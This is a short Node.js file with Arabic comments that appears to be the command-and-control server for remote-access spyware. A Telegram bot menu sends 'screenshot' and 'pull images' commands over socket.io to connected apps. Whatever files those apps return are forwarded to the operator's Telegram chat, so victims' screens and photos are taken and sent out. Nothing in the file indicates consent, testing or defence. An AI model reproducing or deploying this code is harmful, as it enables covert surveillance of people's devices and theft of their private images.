
const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, { cors: { origin: "*" } });
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');

const config = JSON.parse(fs.readFileSync('data.json', 'utf8'));
const bot = new TelegramBot(config.token, { polling: true });

// أوامر التحكم
bot.onText(/\/start/, (msg) => {
    bot.sendMessage(msg.chat.id, 'مرحباً ملك حسون، السيرفر يعمل. اختر أمراً:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📸 سكرين شوت', callback_data: 'screenshot' }, { text: '📂 سحب الصور', callback_data: 'get_images' }]
            ]
        }
    });
});

// إرسال الأوامر للتطبيق
bot.on('callback_query', (query) => {
    io.emit('command', query.data);
    bot.answerCallbackQuery(query.id, { text: 'تم إرسال: ' + query.data });
});

// استقبال البيانات من التطبيق
io.on('connection', (socket) => {
    console.log('🔗 اتصال جديد من التطبيق');
    socket.on('data', (data) => {
        bot.sendDocument(config.id, Buffer.from(data), { caption: '📸 ملف مستلم' });
    });
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => console.log('🚀 السيرفر يعمل الآن على البورت ' + PORT));

